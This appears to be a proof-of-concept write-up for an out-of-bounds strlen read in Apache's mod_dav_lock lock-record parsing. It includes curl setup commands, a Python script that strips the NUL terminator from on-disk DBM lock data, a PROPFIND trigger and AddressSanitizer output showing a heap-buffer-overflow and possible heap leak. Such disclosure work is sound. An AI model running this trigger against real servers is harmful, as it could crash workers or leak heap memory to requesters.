# 039 - mod_dav_lock unbounded strlen on owner/auth_user

`modules/dav/lock/locks.c:523` calls `strlen(val.dptr + offset)` on
direct-lock owner bytes without confirming a NUL terminator exists in
the fetched DBM datum. An unterminated owner field walks past the
buffer end.

## Setup

Same DAV configuration as PoC 038. Take a real lock with an owner
string so the on-disk layout contains the direct-record fixed prefix,
then rewrite the value to remove the trailing NUL.

```apache
# tmp/httpd.conf - identical to PoC 038
```

```bash
mkdir -p /tmp/poc-dav/htdocs
curl -X PUT -d hi http://127.0.0.1:8080/f
curl -X LOCK -H 'Content-Type: text/xml' --data-binary @- \
  http://127.0.0.1:8080/f <<'EOF'
<?xml version="1.0"?>
<D:lockinfo xmlns:D="DAV:">
  <D:lockscope><D:exclusive/></D:lockscope>
  <D:locktype><D:write/></D:locktype>
  <D:owner>AAAAAAAAAAAAAAAAAAAAAAAA</D:owner>
</D:lockinfo>
EOF
```

## Trigger

Strip the owner-terminating NUL and any trailing bytes so the datum
ends in the middle of `owner`:

```python
# tmp/strip_owner_nul.py
import dbm.ndbm as ndbm, struct, sys

# dav_lock_discovery_fixed is roughly: char locktype, char lockscope,
# int depth, time_t timeout. Header tag occupies 1 byte. lock token is
# sizeof(apr_uuid_t) = 16 bytes. The exact size_of(fixed) is platform-
# specific; print sizeof on the build to confirm.
FIXED_SIZE = int(sys.argv[1]) if len(sys.argv) > 1 else 24
TAG = 1
UUID = 16
PREFIX = 1 + FIXED_SIZE + UUID

db = ndbm.open('/tmp/poc-dav/locks', 'w')
for k in list(db.keys()):
    v = bytes(db[k])
    if not v or v[0] != 0x01:
        continue
    # Keep header + 'AAAAAAAA...' but no terminating NUL.
    db[k] = v[:PREFIX] + b'A' * 32       # no \x00 anywhere after
db.close()
```

```bash
python3 tmp/strip_owner_nul.py 24      # adjust to fixed-struct size
curl -i -X PROPFIND -H 'Depth: 0' \
  -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:prop><D:lockdiscovery/></D:prop></D:propfind>' \
  http://127.0.0.1:8080/f
```

For determinism, run under ASan:

```bash
CFLAGS="-fsanitize=address -g" ./configure --enable-dav --enable-dav-lock
make && ./httpd -X -f tmp/httpd.conf
```

## Observed effect

`dav_generic_load_lock_record()` reaches the owner block with
`offset` pointing at the unterminated `'A'` bytes and calls
`strlen(val.dptr + offset)`. Because there is no NUL inside
`val.dsize - offset`, the scan continues past the SDBM allocation.

ASan prints, on the active worker:

```
==pid==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x... in __interceptor_strlen
    #1 dav_generic_load_lock_record locks.c:523
```

The request returns `500 Internal Server Error`. Without ASan, the
worker may copy adjacent heap bytes through `apr_pstrmemdup()`, which
can leak them into the `lockdiscovery` XML response if the scan finds
a stray NUL before crossing into an unmapped page.

The same trigger reproduces against the `auth_user` field by leaving
the owner block intact and corrupting the field that follows.
